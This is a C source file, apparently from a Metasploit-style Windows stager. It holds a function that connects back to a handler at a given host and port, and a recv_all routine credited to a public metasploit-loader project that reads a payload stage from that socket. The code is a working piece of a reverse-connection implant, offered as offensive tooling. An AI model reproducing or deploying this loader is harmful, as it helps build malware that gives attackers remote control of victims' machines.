#include "main.h"
/*
Steps are as follows:
1- Initialize winsock
2- Connect to lhost:lport
3- Return socket on success, INVALID_SOCKET otherwise...
*/

SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.com/en-us/library/windows/desktop/ms737591(v=vs.85).aspx
{
	WSADATA wsaData;
	SOCKET SocketToHandler = INVALID_SOCKET;
	char ansiIP[1024] = {0};
	char ansiPort[128] = {0};

	UnicodeToAnsi(ansiIP,IP);//I do not know why this works for me without problems, but when using wcstombs instead, ultimet stops responding w/error after KILLING THE SESSION FROM THE HANDLER SIDE...
	UnicodeToAnsi(ansiPort,iPort);
	//wcstombs(ansiIP,IP,wcslen(IP));
	//wcstombs(ansiPort,iPort,wcslen(iPort));

	struct addrinfo *result = NULL;	// A pointer to a linked list of addrinfo structures that contains response information about the host.
	struct addrinfo hints = {0};	// A pointer to an addrinfo structure that provides hints about the type of socket the caller supports. `getaddrinfo()`

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0)
	{
		printf("WSAStartup failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Resolve the handler address and port
	hints.ai_family = AF_INET;		// fill the hints structure 
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(ansiIP, ansiPort, &hints, &result);
	if ( iResult != 0 ) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Create a SOCKET for connecting to server
	SocketToHandler = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (SocketToHandler == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to handler
	iResult = connect( SocketToHandler, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(SocketToHandler);
		return INVALID_SOCKET;
	}
	return SocketToHandler;
} 

// The author of the code below is Raphael Mudge (raffi@strategiccyber.com),
// https://github.com/rsmudge/metasploit-loader
int recv_all(SOCKET socket, unsigned char* buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	unsigned char* startb = buffer;
	while (tret < len) {
		nret = recv(socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;
/*
		if (nret == SOCKET_ERROR)
		{
			dprintf(L"[-] Error receiving data! WSAGetLastError: %d\n", WSAGetLastError());
			exit(1);
		}
		*/
	}
	return tret;
}